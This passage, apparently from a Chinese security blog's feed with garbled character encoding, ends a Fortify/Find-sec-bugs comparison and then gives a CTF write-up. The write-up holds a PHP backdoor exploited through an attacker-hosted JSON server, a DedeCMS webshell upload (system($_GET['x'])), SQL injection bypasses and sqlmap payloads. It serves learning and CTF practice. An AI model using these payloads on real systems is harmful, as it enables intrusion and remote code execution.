ï¼Œæœªè¢«å£°æ˜ä¸ºstaticçš„loggerç­‰</p></li></ul><h1 id="ä¸Find-sec-bugså¯¹æ¯”"><a href="#ä¸Find-sec-bugså¯¹æ¯”" class="headerlink" title="ä¸Find-sec-bugså¯¹æ¯”"></a>ä¸Find-sec-bugså¯¹æ¯”</h1><p>find-sec-bugsç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å¼€æºjavaä»£ç å®¡è®¡å·¥å…·äº†ï¼Œè¿™é‡Œå¯¹æ¯”ä¸€ä¸‹æ‰«æè´¨é‡ï¼Œè¿˜æ˜¯æ‹¿java-sec-codeæ¥æ¯”è¾ƒï¼Œjava-sec-codeä¸€åˆ—æ•°å­—è¡¨ç¤ºçœŸå®APIæ•°/å®‰å…¨APIæ•°ï¼Œå…¶ä»–ä¸¤æ‰«æå™¨åˆ—æ•°å­—è¡¨ç¤ºæ£€å‡ºçœŸå®æ¼æ´æ•°/è¯¯æŠ¥æ•°ï¼Œç»“åˆè¿™å‡ ä¸ªæ•°æ®å¯ä»¥ç®—å‡ºæ¼æŠ¥å’Œè¯¯æŠ¥ç‡ã€‚</p><div class="table-container"><table><thead><tr><th></th><th>java-sec-code</th><th>Fortify</th><th>Find-sec-bugs</th></tr></thead><tbody><tr><td>CommandInject/RCE</td><td>2+1=3/1</td><td>3/1</td><td>3/1</td></tr><tr><td>CORS</td><td>3/1</td><td>1/1</td><td>2/1</td></tr><tr><td>Deserialize</td><td>2/0</td><td>0/0</td><td>1/1</td></tr><tr><td>Fastjson</td><td>1/0</td><td>0/0</td><td>0/0</td></tr><tr><td>FileUpload</td><td>1/1</td><td>1/2</td><td>1/2</td></tr><tr><td>IP Forge</td><td>1/1</td><td>0/0</td><td>0/0</td></tr><tr><td>Java RMI</td><td>1/0</td><td>0/0</td><td>0/0</td></tr><tr><td>JSONP</td><td>4/1</td><td>0/0</td><td>0/0</td></tr><tr><td>XXE+OOXML+ XLSX+XStream</td><td>9+1+1+1=12/8</td><td>6/0</td><td>6/0</td></tr><tr><td>PathTraversal</td><td>1/1</td><td>1/1</td><td>1/1</td></tr><tr><td>SpEL</td><td>1/0</td><td>1/0</td><td>1/0</td></tr><tr><td>SQLi</td><td>3/4</td><td>3/0</td><td>1/0</td></tr><tr><td>SSRF</td><td>8/1</td><td>5/1</td><td>3/1</td></tr><tr><td>SSTIï¼ˆvelocityï¼‰</td><td>1/0</td><td>1/0</td><td>1/0</td></tr><tr><td>URL Redirect</td><td>3/2</td><td>2/1</td><td>3/1</td></tr><tr><td>URL whitelist Bypass</td><td>5/3</td><td>0/0</td><td>0/0</td></tr><tr><td>XSS</td><td>2+4(ssrf)=6/1</td><td>6/4</td><td>0/0</td></tr></tbody></table></div><p>æ€»ä½“å¯¹æ¯”ä¸‹æ¥ï¼Œfortifyä¸æ˜¯å¾ˆå ä¼˜åŠ¿ï¼Œä¸»è¦åŒºåˆ«åœ¨äºåå°„å‹XSSâ€”â€”Fortifyæ£€æµ‹åˆ°6ä¸ªè€ŒFind-sec-bugsæ²¡æœ‰æ£€æµ‹åˆ°ï¼ŒSSRFâ€”â€”Fortifyå¤šæ£€å‡º2ä¸ªï¼Œä½†è¿™äº›å·®å¼‚ä¼°è®¡æ˜¯ç”±äºè§„åˆ™å¯¼è‡´çš„ï¼Œç»™Find-sec-bugså¢åŠ ä¸€äº›sourceå’Œsinkç‚¹å°±èƒ½å¤Ÿå¼¥è¡¥ã€‚</p><p>å¦å¤–ï¼ŒFind-sec-bugså‘ç°ä¸¤å¤„å¯†ç ç¡¬ç¼–ç è€ŒFortifyæœªå‘ç°ï¼š</p><p><img src="/whitebox-Fortifyä½¿ç”¨åˆæ¢/1571804597569.png" alt="1571804597569"></p>]]></content>
      
      
      <categories>
          
          <category> æºç å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> æºç å®‰å…¨ </tag>
            
            <tag> Fortify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£å¤§èµ›ç»ƒä¹ é¢˜wp</title>
      <link href="/ctf-2019%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E7%BB%83%E4%B9%A0%E9%A2%98wp/"/>
      <url>/ctf-2019%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E7%BB%83%E4%B9%A0%E9%A2%98wp/</url>
      
        <content type="html"><![CDATA[<h1 id="çˆ±ã„çª’æ¯ã€ç—›"><a href="#çˆ±ã„çª’æ¯ã€ç—›" class="headerlink" title="çˆ±ã„çª’æ¯ã€ç—›"></a>çˆ±ã„çª’æ¯ã€ç—›</h1><h2 id="0x01-è·¯å¾„éå†"><a href="#0x01-è·¯å¾„éå†" class="headerlink" title="0x01 è·¯å¾„éå†"></a>0x01 è·¯å¾„éå†</h2><p>æ‰“å¼€åœ°å€çœ‹åˆ°è·¯å¾„éå†ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571126059065.png" alt="1571126059065"></p><p>åœ¨uploadæ–‡ä»¶å¤¹ä¸‹å‘ç°åé—¨å’Œå…¶æºç </p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571141073240.png" alt="1571141073240"></p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571141089817.png" alt="1571141089817"></p><h2 id="0x02-åé—¨å®¡è®¡"><a href="#0x02-åé—¨å®¡è®¡" class="headerlink" title="0x02 åé—¨å®¡è®¡"></a>0x02 åé—¨å®¡è®¡</h2><p>æ ¼å¼åŒ–åï¼Œè¿›è¡Œä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// UAæ˜¯md5(POST['pass'])</span></span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è¿™é‡Œäº§ç”Ÿä¸€ä¸ªurl</span></span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    <span class="comment">// ä»urlè·å–æ–‡ä»¶å†…å®¹ï¼ŒSSRF</span></span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// CodeInjection, may cause RCE, e.g.,&#123;"f":"system","d":"ls"&#125;</span></span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span>.$f.$g; <span class="comment">// url=http://pass[30:35]+pass[10:20], i.e.,url&lt;=15</span></span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;<span class="comment">/*...*/</span>&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>å…¶é¦–å…ˆæ£€æŸ¥UAæ˜¯å¦ç­‰äºmd5(POST[â€˜passâ€™])ï¼Œæ¥ç€å–passå‚æ•°çš„ä¸¤éƒ¨åˆ†ï¼ˆpassé•¿åº¦è¦æ±‚å¤§äº40ï¼‰ï¼Œç»„è£…æˆä¸€ä¸ªurlï¼Œä»è¯¥urlè·å–ä¸€ä¸ªjsonï¼Œå†ä»jsonä¸­çš„få˜é‡è·å–å‡½æ•°åï¼Œdå˜é‡è·å–å‚æ•°ï¼Œå¹¶æ‰§è¡Œã€‚</p><h2 id="0x03-æ„é€ æ¶æ„json"><a href="#0x03-æ„é€ æ¶æ„json" class="headerlink" title="0x03 æ„é€ æ¶æ„json"></a>0x03 æ„é€ æ¶æ„json</h2><p>æŒ‰ä¹‹å‰åˆ†æï¼Œæœ€çœäº‹çš„æ–¹æ³•æ˜¯åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šä¸€èµ·ä¸ª80æœåŠ¡ï¼Œç„¶åè¿”å›æ¶æ„json</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,jsonify</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srv</span><span class="params">()</span>:</span></span><br><span class="line">    resp=dict(f=<span class="string">"system"</span>,d=<span class="string">"ls"</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-åé—¨åˆ©ç”¨"><a href="#0x04-åé—¨åˆ©ç”¨" class="headerlink" title="0x04 åé—¨åˆ©ç”¨"></a>0x04 åé—¨åˆ©ç”¨</h2><p>æœ€åä¸€æ­¥ï¼Œæ„é€ åé—¨è¯·æ±‚ã€‚é¦–å…ˆï¼Œå‡è®¾æˆ‘æœåŠ¡å™¨æ˜¯216.126.239.124</p><p>å…ˆç”Ÿæˆpasså‚æ•°ï¼Œç”»ä¸ªè‰å›¾å¥½å†™ä»£ç ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571317896911.png" alt="1571317896911"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: url=<span class="string">"216.126.239.124"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: _pass=<span class="string">'a'</span>*<span class="number">10</span>+url[<span class="number">5</span>:<span class="number">15</span>]+<span class="string">'b'</span>*<span class="number">10</span>+url[:<span class="number">5</span>]+<span class="string">'c'</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: _pass</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc'</span></span><br></pre></td></tr></table></figure><p>å†ç”ŸæˆUAï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [4]: import hashlib</span><br><span class="line"></span><br><span class="line">In [5]: hashlib.md5(_pass.encode(&apos;ascii&apos;)).hexdigest()</span><br><span class="line">Out[5]: &apos;98a36c28cf36c4d8eeb8055a3538562e&apos;</span><br></pre></td></tr></table></figure><p>å°è¯•å‘é€payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://114.55.36.69:8020/upload/dama.php -X POST -H &quot;User-agent: 98a36c28cf36c4d8eeb8055a3538562e&quot; -d &apos;pass=aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc&apos;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°payloadç”Ÿæ•ˆäº†ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571144854091.png" alt="1571144854091"></p><p>æ‰¾ä¸€ä¸‹flagï¼Œéœ€è¦ä¿®æ”¹æˆ‘ä»¬æœåŠ¡å™¨ä¸Šçš„payload</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571145028036.png" alt="1571145028036"></p><p>ç„¶åæ‰¾åˆ°ç›®å½•<code>/var/www/html/flag.php</code>ï¼Œcatå¾—åˆ°flagï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571145141787.png" alt="1571145141787"></p><h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><h2 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a>0x00 ä¿¡æ¯æ”¶é›†</h2><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç”¨ç»‡æ¢¦CMSå†™çš„ç½‘ç«™ï¼Œæ‹‰åˆ°æœ€ä¸‹é¢çœ‹åˆ°ç‰ˆæœ¬ç–‘ä¼¼æ˜¯v5.7sp2ï¼Œæƒ³åˆ°ç»‡æ¢¦CMSV5.7SP2åå°å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¦æƒ…è§<a href="https://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/164035.html</a></p><h2 id="0x01-å¼±å¯†ç "><a href="#0x01-å¼±å¯†ç " class="headerlink" title="0x01 å¼±å¯†ç "></a>0x01 å¼±å¯†ç </h2><p>è®¿é—® <code>/dede/login.php</code>ï¼Œçœ‹åˆ°ç®¡ç†ç™»å½•é¡µé¢ï¼Œè¿™é‡Œå­˜åœ¨å¼±å¯†ç ï¼š admin:admin</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571126576237.png" alt="1571126576237"></p><h2 id="0x02-ä»£ç å®¡è®¡"><a href="#0x02-ä»£ç å®¡è®¡" class="headerlink" title="0x02 ä»£ç å®¡è®¡"></a>0x02 ä»£ç å®¡è®¡</h2><p> todo</p><h2 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨"></a>0x02 æ¼æ´åˆ©ç”¨</h2><p>ç¬¬ä¸€æ­¥ï¼Œ<code>GET /dede/tpl.php?action=upload</code>ï¼Œè·å–csrftoken</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571127184086.png" alt="1571127184086"></p><p>ç¬¬äºŒæ­¥ï¼Œ<code>GET /dede/tpl.php?filename=anemone.lib.php&amp;action=savetagfile&amp;content=%3C?php%20var_dump(system($_GET[&#39;x&#39;]));?%3E&amp;token={csrf_token}</code>ï¼Œä¸Šä¼ ä¸€å¥è¯</p><p>ç¬¬ä¸‰æ­¥ï¼Œ<code>GET /include/taglib/anemone.lib.php?x=ls</code>ï¼Œèƒ½RCEäº†ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571128235789.png" alt="1571128235789"></p><h2 id="0x04-æ‰¾flag"><a href="#0x04-æ‰¾flag" class="headerlink" title="0x04 æ‰¾flag"></a>0x04 æ‰¾flag</h2><p><code>GET /include/taglib/anemone.lib.php?x=find%20/%20-name%20flag</code></p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571128339477.png" alt="1571128339477"></p><p><code>GET /include/taglib/anemone.lib.php?x=cat%20/tmp/flagishere/flagishere/flagishere/flag</code></p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571128497061.png" alt="1571128497061"></p><p>ï¼ˆflagè¢«äººæ”¹äº†å—ï¼Ÿï¼‰</p><h1 id="æ–°çš„æ–°é—»æœç´¢"><a href="#æ–°çš„æ–°é—»æœç´¢" class="headerlink" title="æ–°çš„æ–°é—»æœç´¢"></a>æ–°çš„æ–°é—»æœç´¢</h1><h2 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h2><p>å°è¯•ä¸€äº›payloadï¼Œçœ‹åˆ°æœ‰SQLæ³¨å…¥ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571129558998.png" alt="1571129558998"></p><p>ä½†æ˜¯union,selectä¼šè¢«è¿‡æ»¤</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571130055314.png" alt="1571130055314"></p><p>å°è¯•<code>/*!select*/</code>ç»•è¿‡</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571130170687.png" alt="1571130170687"></p><p>æŸ¥åº“ï¼Œå¾—åˆ°newsï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/step2-1541417918841.png" alt="step2"></p><p>æŸ¥è¡¨ï¼Œå¾—åˆ°adminè¡¨ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/step3-1541417936188.png" alt="step3"></p><p>æŸ¥åˆ—ï¼Œå¾—åˆ°flagåˆ—</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/step4.png" alt="step4"></p><p>æŸ¥è®°å½•ï¼Œå¾—åˆ°flagï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/step5.png" alt="step5"></p><h2 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h2><p>å°è¯•sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -r D:\MEGAsync\mooctest2019exer\new-news.txt  --level 3 --risk 3</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 233 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: word=-2704<span class="string">' OR 5368=5368-- AyLy&amp;number=5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)</span></span><br><span class="line"><span class="string">    Payload: word=test'</span> OR SLEEP(5)-- pJuo&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="å¸¸è§„æ“ä½œ"><a href="#å¸¸è§„æ“ä½œ" class="headerlink" title="å¸¸è§„æ“ä½œ"></a>å¸¸è§„æ“ä½œ</h1><p>çœ‹åˆ°<code>/index.php?url=upload</code>å¯ä»¥æƒ³åˆ°urlå¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«/SSRF/URLRedirecté—®é¢˜ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571131861906.png" alt="1571131861906"></p><p>base64decodeåå¾—åˆ°flag</p><h1 id="æ–°é—»æœç´¢"><a href="#æ–°é—»æœç´¢" class="headerlink" title="æ–°é—»æœç´¢"></a>æ–°é—»æœç´¢</h1><p>å°è¯•æ³¨å…¥</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571130487146.png" alt="1571130487146"></p><p>ä¸€æ­¥æ­¥æ³¨å…¥å¾—åˆ°flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word=test&apos; union select 1,2,3 %23&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®"><a href="#ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®" class="headerlink" title="ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®"></a>ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®</h1><h2 id="æºç æ³„éœ²"><a href="#æºç æ³„éœ²" class="headerlink" title="æºç æ³„éœ²"></a>æºç æ³„éœ²</h2><p>æ‰«æå‘ç°æºä»£ç æ³„éœ²ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571130863836.png" alt="1571130863836"></p><p>è¿˜åŸæºä»£ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./Dumper/gitdumper.sh http://114.55.36.69:8023/.git/ /temp/hackerone</span><br><span class="line">./Extractor/extractor.sh /temp/hackerone /temp/hackerone</span><br></pre></td></tr></table></figure><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p>ä»index.php:11-14çœ‹åˆ°ï¼Œå¦‚æœæ˜¯ç®¡ç†å‘˜ï¼Œåˆ™å¯ä»¥æ‹¿åˆ°flagï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571212369176.png" alt="1571212369176"></p><p>è·Ÿis_admin(class.user.php):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">       <span class="comment">// æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦åˆæ³•</span></span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">       <span class="comment">//è·å–userfileï¼Œå…¶ä¸­æœ‰ä¸€å±æ€§ä¸ºis_admin</span></span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'is_admin'</span>] === <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_username</span><span class="params">($username)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($username) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^[_\.\-0-9a-zA-Z]+$/i'</span>, $username)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_attrs</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$users = zUserFile::get_all_users();</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $users[<span class="string">'attrs'</span>][$username];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>is_adminæ²¡æœ‰çªç 